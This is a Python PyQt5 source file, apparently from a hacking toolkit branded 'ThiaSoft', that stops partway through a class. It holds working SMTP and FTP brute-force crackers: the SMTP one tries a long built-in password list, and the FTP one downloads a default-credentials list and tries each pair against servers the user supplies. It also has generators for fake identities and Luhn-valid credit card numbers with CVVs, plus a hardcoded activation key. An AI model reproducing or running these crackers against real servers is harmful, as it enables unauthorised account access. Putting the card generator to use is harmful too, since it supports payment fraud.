# BY @thiasoft
# Coded by RENC(@Xahrvs)


import sys
import random
import math
import ctypes
import smtplib
import json
import platform
import sys
import qrcode
from io import BytesIO
import pywifi
import dns.resolver
import requests
import html
import concurrent.futures
import ftplib
import os
import marshal
import base64
import subprocess
import socket
import whois
import socks
import string
import shutil
import time
import phonenumbers
import sqlite3
import shodan
import pandas as pd
import requests
import random
import subprocess
import threading
import hashlib
import webbrowser
import re
import urllib.parse
import scapy.all as scapy
import importlib.util
import webbrowser
import matplotlib.pyplot as plt
from http.server import SimpleHTTPRequestHandler, HTTPServer
from bs4 import BeautifulSoup
from PIL import Image
from pyzbar.pyzbar import decode
from datetime import datetime, timedelta
from phonenumbers import carrier, geocoder, timezone
from matplotlib.backends.backend_qt5agg import FigureCanvasQTAgg as FigureCanvas
from matplotlib.figure import Figure


from email.mime.text import MIMEText
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import quote, urljoin, urlencode, urlparse
from email.mime.multipart import MIMEMultipart
from PyQt5.QtWidgets import (
    QDoubleSpinBox,
    QSpinBox,
    QComboBox,
    QGridLayout,
    QHBoxLayout,
    QFormLayout,
    QProgressBar,
    QFileDialog,
    QCheckBox,
    QGroupBox, 
    QScrollArea,
    QSplitter,
    QRadioButton,
    QButtonGroup,
    QStyleFactory,
    QMenuBar,
    QTableWidget,
    QTableWidgetItem,
    QHeaderView,
    QTabWidget,
    QSlider,
    QInputDialog,
    QApplication,
    QMainWindow, 
    QWidget,
    QVBoxLayout,
    QAbstractItemView,
    QTreeView,
    QTreeWidget,
    QTreeWidgetItem,
    QListView,
    QPlainTextEdit,
    QTreeWidgetItemIterator,
    QSpacerItem, 
    QSizePolicy
)
from PyQt5.QtGui import QIcon, QPixmap, QPen, QClipboard
from PyQt5.QtGui import QLinearGradient, QBrush, QPalette
from PyQt5.QtCore import QThread, pyqtSignal, QTime, QAbstractItemModel, QModelIndex, QDir, QUrl, QEasingCurve, QStringListModel
from PyQt5.QtCore import Qt, QPoint, QPropertyAnimation, pyqtSlot
from PyQt5.QtWidgets import QDialog, QLineEdit, QPushButton, QLabel, QMessageBox, QAction, QTextEdit
from PyQt5.QtGui import QPainter, QColor
from PyQt5.QtCore import QTimer, QPointF, QThreadPool, QRunnable, QObject
from PyQt5.QtGui import QDesktopServices, QFont
from PyQt5.QtChart import QChart, QChartView, QLineSeries, QValueAxis, QBarSeries, QBarSet
from PyQt5.QtCore import QUrl, QUrlQuery
from PyQt5.QtNetwork import QNetworkAccessManager, QNetworkRequest, QNetworkReply

def gradient_text(text, start_color, end_color):
    def interpolate(start, end, factor):
        return start + (end - start) * factor
    lines = text.split('\n')
    gradient_lines = []
    total_lines = len(lines)
    for i, line in enumerate(lines):
        factor = i / (total_lines - 1) if total_lines > 1 else 0
        r = int(interpolate(start_color[0], end_color[0], factor))
        g = int(interpolate(start_color[1], end_color[1], factor))
        b = int(interpolate(start_color[2], end_color[2], factor))
        color_code = f'\033[38;2;{r};{g};{b}m'
        gradient_lines.append(f'{color_code}{line}\033[0m')
    return '\n'.join(gradient_lines)
text = '''© ThiaSoft 14.06.2024
ThiaSoft Inc.
Telegram: https://t.me/thiasoft
'''
start_color = (255, 0, 0)  
end_color = (0, 0, 255)    
print(gradient_text(text, start_color, end_color))


def generate_personality():
    male_first_names = [
        "John", "Robert", "Michael", "David", "James", "William", "Richard", 
        "Joseph", "Charles", "Thomas", "Liam", "Noah", "Ethan", "Mason", "Aiden", "David", "Daniel", "Matthew",
        "Jackson", "Samuel", "Henry", "Sebastian"   
    ]
    female_first_names = [
        "Jane", "Alice", "Emily", "Laura", "Mary", "Linda", "Barbara", "Elizabeth", 
        "Jennifer", "Patricia", "Sofia", "Olivia", "Emma", "Ava", "Isabella", "Sophia", "Mia"
    ]
    last_names = [
        "Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", 
        "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez", "Wilson", "Anderson", 
        "Thomas", "Taylor", "Moore", "Martin", "Lee", "Perez", "Thompson", 
        "White", "Harris", "Sanchez", "Clark", "Ramirez", "Lewis", "Robinson", "Walker"
    ]
    street_names = [
        "Main St", "High St", "Park Ave", "Oak St", "Pine St", "Maple St", "Cedar St", 
        "Elm St", "Walnut St", "Willow St", "Church St", "Washington Ave", "Lake St", 
        "Hill St", "River Rd", "Forest Ave", "Meadow Ln", "Valley View Dr", "Highland Ave", 
        "Sunset Blvd", "Broadway", "Spring St", "Summer St", "Winter St", "Autumn Ln"
    ]
    city_names = [
        "New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia", 
        "San Antonio", "San Diego", "Dallas", "San Jose", "Austin", "Jacksonville", 
        "Fort Worth", "Columbus", "Charlotte", "San Francisco", "Seattle", "Denver", 
        "Boston", "Nashville", "Portland", "Las Vegas", "Miami", "Atlanta", "Detroit"
    ]
    state_info = {
        "NY": "New York", "CA": "California", "IL": "Illinois", "TX": "Texas", 
        "AZ": "Arizona", "PA": "Pennsylvania", "FL": "Florida", "OH": "Ohio", 
        "NC": "North Carolina", "GA": "Georgia", "MI": "Michigan", "NJ": "New Jersey", 
        "VA": "Virginia", "WA": "Washington", "MA": "Massachusetts", "IN": "Indiana", 
        "TN": "Tennessee", "MO": "Missouri", "MD": "Maryland", "WI": "Wisconsin"
    }
    email_domains = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com", "icloud.com"]
    occupations = [
        "Teacher", "Engineer", "Doctor", "Nurse", "Lawyer", "Accountant", "Salesperson", 
        "Manager", "Chef", "Artist", "Writer", "Programmer", "Designer", "Scientist", 
        "Entrepreneur", "Mechanic", "Electrician", "Plumber", "Photographer", "Musician"
    ]
    
        
    def get_name():
        first_name = random.choice(male_first_names + female_first_names)
        gender = "male" if first_name in male_first_names else "female"
        last_name = random.choice(last_names)
        
        if gender == "male" and last_name in ["Smith", "Johnson", "Williams", "Brown", "Jones"]: 
            return first_name, last_name
        elif gender == "female" and last_name not in ["Smith", "Johnson", "Williams", "Brown", "Jones"]:
            return first_name, last_name
        else:
            return get_name() 
    
    first_name, last_name = get_name()
    house_number = random.randint(100, 9999)
    street_name = random.choice(street_names)
    city_name = random.choice(city_names)
    state_abbr = random.choice(list(state_info.keys()))
    state_name = state_info[state_abbr]
    zip_code = f"{random.randint(10000, 99999):05d}"
    name = f"{first_name} {last_name}"
    address = f"{house_number} {street_name}, {city_name}, {state_abbr} {zip_code}"
    current_date = datetime.now()
    age = random.randint(18, 90)
    birth_date = current_date - timedelta(days=age*365 + random.randint(0, 365))
    email = f"{first_name.lower()}.{last_name.lower()}{random.randint(1, 999)}@{random.choice(email_domains)}"
    phone = f"({random.randint(100, 999)}) {random.randint(100, 999)}-{random.randint(1000, 9999)}"
    
    personality = {
        "name": name,
        "age": age,
        "birth_date": birth_date.strftime("%Y-%m-%d"),
        "address": address,
        "city": city_name,
        "state": state_name,
        "zip_code": zip_code,
        "email": email,
        "phone": phone,
        "occupation": random.choice(occupations)
    }

    return personality


def generate_luhn_digit(number):
    digits = [int(d) for d in str(number)]
    checksum = sum(digits[-2::-2]) + sum(sum(divmod(d*2,10)) for d in digits[-1::-2])
    return (10 - checksum % 10) % 10
def generate_fake_card():
    card_types = {
        "Visa": {"prefix": "4", "length": [13, 16]},
        "MasterCard": {"prefix": ["51", "52", "53", "54", "55"], "length": [16]},
        "American Express": {"prefix": ["34", "37"], "length": [15]},
        "Discover": {"prefix": ["6011", "644", "645", "646", "647", "648", "649", "65"], "length": [16]},
        "JCB": {"prefix": ["3528", "3529", "353", "354", "355", "356", "357", "358"], "length": [16]},
        "Diners Club": {"prefix": ["300", "301", "302", "303", "304", "305", "36", "38"], "length": [14, 16]}
    }
    card_type = random.choice(list(card_types.keys()))
    card_info = card_types[card_type]
    prefix = random.choice(card_info["prefix"]) if isinstance(card_info["prefix"], list) else card_info["prefix"]
    length = random.choice(card_info["length"])
    partial_card_number = prefix + "".join([str(random.randint(0, 9)) for _ in range(length - len(prefix) - 1)])
    check_digit = generate_luhn_digit(partial_card_number)
    card_number = partial_card_number + str(check_digit)
    current_date = datetime.now()
    expiry_date = current_date + timedelta(days=random.randint(365, 1825))  
    cvv = random.randint(100, 999)
    issuers = ["GlobalBank", "CityFinance", "MetroCredit", "OceanTrust", "PeakCapital", "SkylineSavings"]
    card = {
        "type": card_type,
        "number": card_number,
        "expiry_date": expiry_date.strftime("%m/%y"),
        "cvv": f"{cvv:03d}",
        "issuer": random.choice(issuers),
        "cardholder_name": generate_cardholder_name()
    }
    
    return card

def generate_cardholder_name():
    first_names = ["John", "Jane", "Michael", "Emily", "David", "Sarah", "Robert", "Lisa"]
    last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis"]
    return f"{random.choice(first_names)} {random.choice(last_names)}"


class AnimatedPoint:
    def __init__(self, position, velocity):
        self.position = position
        self.velocity = velocity
        self.target_velocity = velocity
        self.alive = True

    def update(self, delta_time):
        self.velocity += (self.target_velocity - self.velocity) * delta_time * 2
        self.position += self.velocity * delta_time

#class WebAnimation(QWidget):
#    def __init__(self):
#        super().__init__()
#        self.setMouseTracking(True)
#        self.points = []
#        self.initPoints()
#        self.timer = QTimer(self)
#        self.timer.timeout.connect(self.updateAnimation)
#        self.timer.start(16)  # ~60 ФПС (60 FPS)
#        self.cursor_pos = QPointF(self.width() // 2, self.height() // 2)
#        self.last_update_time = QTime.currentTime()

#    def initPoints(self):
#        num_points = 56 
#        margin = 50
#        self.points = []
#        for _ in range(num_points):
#            x = random.uniform(margin, self.width() - margin)
#            y = random.uniform(margin, self.height() - margin)
#            vx = random.uniform(-20, 20) 
#            vy = random.uniform(-20, 20)
#            point = AnimatedPoint(QPointF(x, y), QPointF(vx, vy))
#            self.points.append(point)
        
#    def updateAnimation(self):
#        current_time = QTime.currentTime()
#        delta_time = self.last_update_time.msecsTo(current_time) / 1000.0
#        self.last_update_time = current_time
        
#        for point in self.points:
#            if point.alive:
#                point.update(delta_time)
#                if point.position.x() < 0 or point.position.x() > self.width():
#                    point.target_velocity.setX(-point.target_velocity.x())
#                if point.position.y() < 0 or point.position.y() > self.height():
#                    point.target_velocity.setY(-point.target_velocity.y())

#                point.target_velocity += QPointF(random.uniform(-10, 10), random.uniform(-10, 10)) * delta_time
#                speed = math.sqrt(point.target_velocity.x()**2 + point.target_velocity.y()**2)
#                if speed > 50:
#                    point.target_velocity *= 50 / speed

#        self.update()

#    def mouseMoveEvent(self, event):
#        self.cursor_pos = QPointF(event.pos())
#        super().mouseMoveEvent(event)

#    def mousePressEvent(self, event):
#        if event.button() == Qt.LeftButton:
#            new_point = AnimatedPoint(QPointF(event.pos()), QPointF(random.uniform(-20, 20), random.uniform(-20, 20)))
#            self.points.append(new_point)
#        elif event.button() == Qt.RightButton:
#            self.explode(event.pos())
#        super().mousePressEvent(event)

#    def explode(self, position):
#        explosion_radius = 150
#        explosion_velocity = 100
#        for point in self.points:
#            distance = math.sqrt((position.x() - point.position.x()) ** 2 + (position.y() - point.position.y()) ** 2)
#            if distance < explosion_radius:
#                angle = math.atan2(point.position.y() - position.y(), point.position.x() - position.x())
#                point.target_velocity = QPointF(explosion_velocity * math.cos(angle), explosion_velocity * math.sin(angle))
#                point.alive = False 

#        QTimer.singleShot(2000, self.cleanupPoints)

#    def cleanupPoints(self):
#        self.points = [point for point in self.points if point.alive]

#    def paintEvent(self, event):
#        painter = QPainter(self)
#        painter.setRenderHint(QPainter.Antialiasing)
#        painter.fillRect(self.rect(), QColor(0, 0, 0))
        
#        for i, point in enumerate(self.points):
#            if not point.alive:
#                continue
#            distance = math.sqrt((self.cursor_pos.x() - point.position.x()) ** 2 + (self.cursor_pos.y() - point.position.y()) ** 2)
#            if distance < 200:
#                alpha = int(255 * (1 - distance / 200))
#                painter.setPen(QColor(255, 255, 255, alpha))
#                painter.drawLine(self.cursor_pos.toPoint(), point.position.toPoint())
#                for j, other_point in enumerate(self.points[i+1:], i+1):
#                    distance_between_points = math.sqrt((point.position.x() - other_point.position.x()) ** 2 + (point.position.y() - other_point.position.y()) ** 2)
#                    if distance_between_points < 100:
#                        alpha = int(255 * (1 - distance_between_points / 100))
#                        painter.setPen(QColor(255, 255, 255, alpha))
#                        painter.drawLine(point.position.toPoint(), other_point.position.toPoint())
        
#       painter.setBrush(QColor(255, 255, 255))
#       for point in self.points:
#           painter.drawEllipse(point.position, 2, 2)
#
#   def resizeEvent(self, event):
#       self.initPoints()
#        super().resizeEvent(event)

class AnimatedPoint:
    def __init__(self, position, velocity):
        self.position = position
        self.velocity = velocity

    def update(self, delta_time):
        self.position += self.velocity * delta_time

class AnimatedPoint:
    def __init__(self, position, velocity):
        self.position = position
        self.velocity = velocity

    def update(self, delta_time):
        self.position += self.velocity * delta_time

class WebAnimation(QWidget):
    def __init__(self):
        super().__init__()
        self.setMouseTracking(True)
        self.points = []
        self.initPoints()
        self.timer = QTimer(self)
        self.timer.timeout.connect(self.updateAnimation)
        self.timer.start(16)  # Интервал в 16 мс для улучшенной плавности (~60 FPS)
        self.last_update_time = QTime.currentTime()

    def initPoints(self):
        num_points = 50
        self.points = []
        for _ in range(num_points):
            x = random.uniform(0, self.width())
            y = random.uniform(0, self.height())
            vx = random.uniform(-10, 10)
            vy = random.uniform(20, 40) 
            point = AnimatedPoint(QPointF(x, y), QPointF(vx, vy))
            self.points.append(point)

    def updateAnimation(self):
        current_time = QTime.currentTime()
        delta_time = self.last_update_time.msecsTo(current_time) / 1000.0
        self.last_update_time = current_time

        for point in self.points:
            point.update(delta_time)

            if point.position.y() > self.height():
                point.position.setY(0)
                point.position.setX(random.uniform(0, self.width()))
                point.velocity.setX(random.uniform(-10, 10))
                point.velocity.setY(random.uniform(20, 40))
            point.velocity += QPointF(random.uniform(-1, 1), 0) * delta_time

        self.update()

    def drawSnowflake(self, painter, position, size):
        painter.save()
        painter.translate(position)
        for i in range(6):
            painter.drawLine(0, 0, 0, -size)
            painter.drawLine(0, -size // 2, -size // 4, -3 * size // 4)
            painter.drawLine(0, -size // 2, size // 4, -3 * size // 4)
            painter.rotate(60) 
        painter.restore()

    def paintEvent(self, event):
        painter = QPainter(self)
        painter.setRenderHint(QPainter.Antialiasing)
        painter.fillRect(self.rect(), QColor(0, 0, 0))  # Черный фон
        for i, point in enumerate(self.points):
            for j, other_point in enumerate(self.points[i + 1:], i + 1):
                distance = math.sqrt((point.position.x() - other_point.position.x()) ** 2 +
                                     (point.position.y() - other_point.position.y()) ** 2)
                if distance < 100:
                    alpha = int(255 * (1 - distance / 100))
                    painter.setPen(QPen(QColor(255, 255, 255, alpha), 1))
                    painter.drawLine(point.position, other_point.position)
        painter.setPen(QPen(QColor(255, 255, 255), 1))
        for point in self.points:
            self.drawSnowflake(painter, point.position, 5)  

    def resizeEvent(self, event):
        self.initPoints()
        super().resizeEvent(event)

# Окно авторизации (Login Panel)
class AuthenticationDialog(QDialog):
    def __init__(self):
        super().__init__()
        self.init_ui()

    def init_ui(self):
        self.setWindowTitle("Authentication")
        self.setWindowIcon(QIcon('imgs/key.png'))
        self.setFixedSize(350, 220)
        self.setWindowFlags(self.windowFlags() & ~Qt.WindowContextHelpButtonHint)

        main_layout = QVBoxLayout()
        main_layout.setContentsMargins(25, 25, 25, 25)
        main_layout.setSpacing(20)
        self.setLayout(main_layout)

        form_layout = QFormLayout()
        form_layout.setSpacing(15)
        main_layout.addLayout(form_layout)

        font = QFont("Roboto", 11)

        self.username_entry = self.create_labeled_entry(form_layout, "Username:", font)
        self.key_entry = self.create_labeled_entry(form_layout, "Activation key:", font, QLineEdit.Password)

        button_layout = QHBoxLayout()
        button_layout.setSpacing(15)
        main_layout.addLayout(button_layout)

        self.submit_button = self.create_button("Submit", font, "#2196F3", self.check_activation)
        self.cancel_button = self.create_button("Cancel", font, "#607D8B", self.reject)
        button_layout.addWidget(self.submit_button)
        button_layout.addWidget(self.cancel_button)

        self.setStyleSheet("""
            QDialog {
                background-color: #121212;
                border-radius: 15px;
                color: #ffffff;
                padding: 20px;
            }
            QLabel {
                color: #e0e0e0;
                font-size: 12pt;
                font-weight: 500;
            }
            QLineEdit {
                border-radius: 10px;
                border: 2px solid #1e88e5;
                padding: 10px;
                background-color: #1a1a1a;
                color: #ffffff;
                font-size: 11pt;
                min-height: 20px;
            }
            QLineEdit:focus {
                border: 2px solid #42a5f5;
                background-color: #212121;
                outline: none;
            }
            QLineEdit:hover {
                border: 2px solid #42a5f5;
            }
            QPushButton {
                border-radius: 10px;
                padding: 12px 24px;
                color: white;
                font-weight: bold;
                font-size: 12pt;
                border: none;
                min-width: 100px;
            }
            QPushButton:hover {
                background-color: #42a5f5;
            }
            QPushButton:pressed {
                background-color: #1976d2;
                border-style: inset;
            }

            }
            QMessageBox {
                background-color: #121212;
                color: #ffffff;
            }
            QMessageBox QLabel {
                color: #ffffff;
            }
            QMessageBox QPushButton {
                background-color: #2196F3;
                min-width: 80px;
                padding: 8px 16px;
            }
        """)

        self.animation = QPropertyAnimation(self, b"windowOpacity")
        self.animation.setDuration(500)
        self.animation.setStartValue(0)
        self.animation.setEndValue(1)
        self.animation.setEasingCurve(QEasingCurve.InOutQuad)
        self.animation.start()

    def create_labeled_entry(self, layout, label_text, font, echo_mode=None):
        label = QLabel(label_text)
        label.setFont(font)
        label.setAlignment(Qt.AlignRight | Qt.AlignVCenter)

        entry = QLineEdit()
        entry.setFont(font)
        if echo_mode:
            entry.setEchoMode(echo_mode)

        layout.addRow(label, entry)
        return entry

    def create_button(self, text, font, background_color, callback):
        button = QPushButton(text)
        button.setFont(font)
        button.setStyleSheet(f"background-color: {background_color};")
        button.clicked.connect(callback)
        return button

    def check_activation(self):
        if self.username_entry.text() and self.key_entry.text() == "@thiasoft":
            self.accept()
        else:
            self.shake_window()
            QMessageBox.warning(self, "Invalid Credentials", "Invalid username or activation key. Please try again.")
        
        self.username_entry.clear()
        self.key_entry.clear()

    def shake_window(self):
        self.animation = QPropertyAnimation(self, b"pos")
        self.animation.setDuration(150)
        self.animation.setLoopCount(3)
        
        start_pos = self.pos()
        
        def shake_step(step):
            if step % 2 == 0:
                return start_pos + QPoint(5, 0)
            else:
                return start_pos - QPoint(5, 0)
        
        for i in range(6):
            self.animation.setKeyValueAt(i/5, shake_step(i))
        
        self.animation.start()

    def keyPressEvent(self, event):
        if event.key() == Qt.Key_Return or event.key() == Qt.Key_Enter:
            self.check_activation()
        else:
            super().keyPressEvent(event)
        
# ВЗЛОМ СМТП (SMPT CRACKER)
class SMTPCrackerWorker(QThread):
    log = pyqtSignal(str)
    progress = pyqtSignal(int)
    check_finished = pyqtSignal()

    def __init__(self, servers, passwords):
        super().__init__()
        self.servers = servers
        self.passwords = passwords
        self.is_running = True

    def run(self):
        total = len(self.servers) * len(self.passwords)
        current = 0
        for server in self.servers:
            if not self.is_running:
                break
            for password in self.passwords:
                if not self.is_running:
                    break
                try:
                    server_address, port = server.split(':')
                    port = int(port)
                    with smtplib.SMTP(server_address, port, timeout=10) as smtp:
                        smtp.starttls()
                        smtp.login('user', password)
                        self.log.emit(f"Success: {server_address}:{port} - Password: {password}")
                except smtplib.SMTPAuthenticationError:
                    self.log.emit(f"Failed: {server_address}:{port} - Password: {password}")
                except Exception as e:
                    self.log.emit(f"Error: {server_address}:{port} - {str(e)}")
                current += 1
                self.progress.emit(int((current / total) * 100))
        self.check_finished.emit()

    def stop(self):
        self.is_running = False

class SMTPCracker(QDialog):
    def __init__(self):
        super().__init__()
        self.init_ui()

    def init_ui(self):
        self.setWindowFlags(self.windowFlags() & ~Qt.WindowContextHelpButtonHint)
        self.setWindowTitle("SMTP BruteForce")
        self.setWindowIcon(QIcon('imgs/smtpcheck.png'))
        self.setMinimumSize(700, 500)

        layout = QVBoxLayout()
        servers_group = QGroupBox("SMTP Servers")
        servers_layout = QVBoxLayout()
        self.servers_entry = QTextEdit()
        self.servers_entry.setPlaceholderText("smtp.example.com:25\nsmtp.test.com:587")
        servers_layout.addWidget(self.servers_entry)
        servers_group.setLayout(servers_layout)
        layout.addWidget(servers_group)

        passwords_group = QGroupBox("Passwords")
        passwords_layout = QVBoxLayout()
        self.passwords_entry = QTextEdit()
        self.passwords_entry.setPlaceholderText("Enter custom passwords here\nor use default list")
        self.default_passwords_checkbox = QCheckBox("Use default passwords")
        passwords_layout.addWidget(self.passwords_entry)
        passwords_layout.addWidget(self.default_passwords_checkbox)
        passwords_group.setLayout(passwords_layout)
        layout.addWidget(passwords_group)

        buttons_layout = QHBoxLayout()
        self.load_servers_button = QPushButton("Load Servers from File")
        self.load_servers_button.clicked.connect(self.load_servers_from_file)
        self.load_passwords_button = QPushButton("Load Passwords from File")
        self.load_passwords_button.clicked.connect(self.load_passwords_from_file)
        self.check_button = QPushButton("Start Checking")
        self.check_button.clicked.connect(self.start_checking)
        self.stop_button = QPushButton("Stop")
        self.stop_button.clicked.connect(self.stop_checking)
        self.stop_button.setEnabled(False)
        buttons_layout.addWidget(self.load_servers_button)
        buttons_layout.addWidget(self.load_passwords_button)
        buttons_layout.addWidget(self.check_button)
        buttons_layout.addWidget(self.stop_button)
        layout.addLayout(buttons_layout)
        self.progress_bar = QProgressBar()
        layout.addWidget(self.progress_bar)
        self.result_text = QTextEdit()
        self.result_text.setReadOnly(True)
        layout.addWidget(self.result_text)

        self.setLayout(layout)

    def load_servers_from_file(self):
        file_name, _ = QFileDialog.getOpenFileName(self, "Load Servers File", "", "Text Files (*.txt)")
        if file_name:
            with open(file_name, 'r') as file:
                self.servers_entry.setPlainText(file.read())

    def load_passwords_from_file(self):
        file_name, _ = QFileDialog.getOpenFileName(self, "Load Passwords File", "", "Text Files (*.txt)")
        if file_name:
            with open(file_name, 'r') as file:
                self.passwords_entry.setPlainText(file.read())

    def start_checking(self):
        servers = [line.strip() for line in self.servers_entry.toPlainText().split('\n') if line.strip()]
        if not servers:
            QMessageBox.warning(self, "Warning", "Please enter at least one SMTP server.")
            return

        passwords = [line.strip() for line in self.passwords_entry.toPlainText().split('\n') if line.strip()]
        if not passwords and not self.default_passwords_checkbox.isChecked():
            QMessageBox.warning(self, "Warning", "Please enter at least one password or select default passwords.")
            return

        if self.default_passwords_checkbox.isChecked():
            passwords = self.get_default_passwords()

        self.result_text.clear()
        self.check_button.setEnabled(False)
        self.stop_button.setEnabled(True)
        self.progress_bar.setValue(0)

        self.worker = SMTPCrackerWorker(servers, passwords)
        self.worker.log.connect(self.handle_log)
        self.worker.progress.connect(self.update_progress)
        self.worker.check_finished.connect(self.handle_check_finished)
        self.worker.start()

    def stop_checking(self):
        if hasattr(self, 'worker'):
            self.worker.stop()
        self.stop_button.setEnabled(False)

    def handle_log(self, log_entry):
        self.result_text.append(log_entry)

    def update_progress(self, value):
        self.progress_bar.setValue(value)

    def handle_check_finished(self):
        self.check_button.setEnabled(True)
        self.stop_button.setEnabled(False)
        self.result_text.append("All SMTP servers checked for passwords.")

    @staticmethod
    def get_default_passwords():
        return [
            '123456', 'password', '123456789', 'qwerty', 'abc123',
            'password1', '12345678', 'qwerty123', '1234567', 'password123',
            'welcome', 'admin', 'letmein', '123123', '123321',
            'root', 'ubuntu', 'mail', 'gmail', '123459876',
            '0000', 'idk', 'passw0rd', 'smtp', 'smtp123',
            'server', 'fuckyou', 'john', 'love', 'kali', 'linux',
            'ftp', 'ftp123', 'ftpuser', 'ftp12345', 'ftp123456',
            'david', 'david123', 'david1234', 'david12345', 'david123456',
            'mariyah', 'mariyah123', 'mariyah1234', 'mariyah12345', 'mariyah123456',
            'mariyah1234567', 'mariyah12345678', 'mariyah123456789', 'mariyah1234567890',
            'password123456', 'password1234567', 'password12345678', 'password123456789',
            'password1234567890', 'password12345678901', 'password123456789012',
            'password1234567890123', 'password12345678901234', 'password123456789012345',
            'password1234567890123456', 'password12345678901234567', 'password123456789012345678',
            'password1234567890123456789', 'password12345678901234567890', 'password123456',
            'password123456789012345678901', 'password1234567890123456789012', '181112',
            '125366', '264274', '1', 'pass', 'lass', 'lass123', 'lass1234'
            'ftp1234567', 'ftp12345678', 'ftp123456789', 'ftp1234567890',
            'ftp12345678901', 'ftp123456789012', 'ftp1234567890123', 'ftp12345678901234',
            'ftp123456789012345', 'ftp1234567890123456', 'ftp12345678901234567',
            'ftp123456789012345678', 'ftp1234567890123456789', 'ftp12345678',
            'ftp1233', 'johnny', 'johnny123', 'johnny1234', 'johnny12345',
            'forgot', 'donothack', 'hack', 'hackme', 'hackme123',
            'hackme1234', 'hackme12345', 'hackme123456', 'hackme1234567',
            'hackme12345678', 'hackme123456789', 'hackme1234567890', 'hackme12345678901',
            'hackme123456789012', 'hackme1234567890123', 'hackme12345678901234',
            'hackme123456789012345', 'hackme1234567890123456', 'hackme12345678901234567',
            'hackme123456789012345678', 'rentme', 'rentme123', 'rentme1234',
            'rentme12345', 'rentme123456', 'rentme1234567', 'rentme12345678',
            'rentme123456789', 'rentme1234567890', 'rentme12345678901',
            'rentme123456789012', 'rentme1234567890123', 'rentme12345678901234',
            'rentme123456789012345', 'rentme1234567890123456', 'rentme12345678901234567',
            'arend', 'arch', 'windows', 'server', 'server123', 'server1234',
            'server12345', 'server123456', 'server1234567', 'server12345678',
            'server123456789', 'server1234567890', 'server12345678901',
            'server123456789012', 'server1234567890123', 'server12345678901234',
            'server123456789012345', 'server1234567890123456', 'server12345678901234567',
            'smtp', 'smtp123', 'smtp1234', 'smtp12345', 'smtp123456',
            'smtp1234567', 'smtp12345678', 'smtp123456789', 'smtp1234567890',
            'smtp12345678901', 'smtp123456789012', 'smtp1234567890123',
            'smtp12345678901234', 'smtp123456789012345', 'smtp1234567890123456',
            'smtp12345678901234567', 'smtp123456789012345678', 'smtp1234567890123456789',
            'smtp12345678901234567890', 'smtp123456789012345678901',
            'smtp1234567890123456789012', 'smtp12345678901234567890123',
            'smtp123456789012345678901234', 'smtp1234567890123456789012345',
            'smtp12345678901234567890123456', 'smtp123456789012345678901234567',
            'smtp1234567890123456789012345678', 'smtp1233', 'smtpidk', 'stupid',
            'stupidshit', 'stupid123', 'stupid1234', 'stupid12345', 'stupid123456',
            'RENCH', 'RENCH123', 'RENCH1234', 'RENCH12345', 'RENCH123456',
            'RENCH1234567', 'RENCH12345678', 'RENCH123456789', 'RENCH1234567890',
            'RENCH12345678901', 'RENCH123456789012', 'RENCH1234567890123',
            'RENCH12345678901234', 'RENCH123456789012345', 'RENCH1234567890123456',
            'RENCH12345678901234567', 'RENCH123456789012345678', 'RENCH12345678901',
            'thisis', 'thisis123', 'thisis1234', 'thisis12345', 'thisis123456',
            'thisis1234567', 'thisis12345678', 'thisis123456789', 'thisis1234567890',
            'thisis12345678901', 'thisis123456789012', 'thisis1234567890123',
            'thisis12345678901234', 'thisis123456789012345', 'thisis1234567890123456',
            'eternal ', 'eternal123', 'eternal1234', 'eternal12345',
            'eternal123456', 'eternal1234567', 'eternal12345678', 'eternal123456789',
            'eternal1234567890', 'eternal12345678901', 'eternal123456789012',
            'eternal1234567890123', 'eternal12345678901234', 'eternal123456789012345',
            'eternal1234567890123456', 'eternal12345678901234567', 'eternal123456789012345678'
            

        ]
        
        
class FTPCracker(QDialog):
    def __init__(self):
        super().__init__()
        self.setWindowFlags(self.windowFlags() & ~Qt.WindowContextHelpButtonHint)
        self.setWindowTitle("FTP BruteForce")
        self.setWindowIcon(QIcon('imgs/ftpcheck.png'))
        self.setFixedSize(600, 400)
        layout = QVBoxLayout()

        self.server_label = QLabel("FTP Servers (one per line):")
        layout.addWidget(self.server_label)

        self.servers_entry = QTextEdit()
        self.servers_entry.setPlaceholderText("ftp.example.com:21\nftp.test.com:2121\nftp.another.com")
        layout.addWidget(self.servers_entry)

        self.check_button = QPushButton("Check FTP Default Passwords")
        self.check_button.clicked.connect(self.start_checking)
        layout.addWidget(self.check_button)

        self.result_text = QTextEdit()
        self.result_text.setReadOnly(True)
        layout.addWidget(self.result_text)

        self.setLayout(layout)

    def start_checking(self):
        servers_text = self.servers_entry.toPlainText()
        servers = [line.strip() for line in servers_text.split('\n') if line.strip()]

        self.result_text.clear()
        self.check_button.setEnabled(False)

        self.worker = FTPCrackerWorker(servers)
        self.worker.log.connect(self.handle_log)
        self.worker.check_finished.connect(self.handle_check_finished)
        self.worker.start()

    def handle_log(self, log_entry):
        self.result_text.append(log_entry)

    def handle_check_finished(self):
        self.check_button.setEnabled(True)
        self.result_text.append("All FTP servers checked for default passwords.")

class FTPCrackerWorker(QThread):
    log = pyqtSignal(str)
    check_finished = pyqtSignal()

    def __init__(self, servers):
        super().__init__()
        self.servers = servers

    def run(self):
        try:
            url = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt"
            response = requests.get(url, timeout=10)
            response.raise_for_status()

            passwords = response.text.splitlines()

            with ThreadPoolExecutor(max_workers=5) as executor:
                futures = [executor.submit(self.check_server, server_info, passwords) for server_info in self.servers]
                for future in as_completed(futures):
                    pass

            self.check_finished.emit()

        except Exception as e:
            self.log.emit(f"Error: {str(e)}")

    def check_server(self, server_info, passwords):
        try:
            server, port = server_info.split(':')
            port = int(port)
        except ValueError:
            server = server_info.strip()
            port = 21

        for line in passwords:
            if line.strip():
                try:
                    username, password = line.strip().split(':', 1)
                    with ftplib.FTP() as ftp:
                        ftp.connect(server, port, timeout=5)
                        ftp.login(username, password)
                        log_entry = f"Successful login to {server}:{port} - {username}:{password}"
                        self.log.emit(log_entry)
                        return
                except Exception as e:
                    log_entry = f"Failed to connect to {server}:{port} with {username}:{password}: {str(e)}"
                    self.log.emit(log_entry)

        self.log.emit(f"No successful login found for {server}:{port}")



class SMTPReporter(QDialog):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.init_ui()

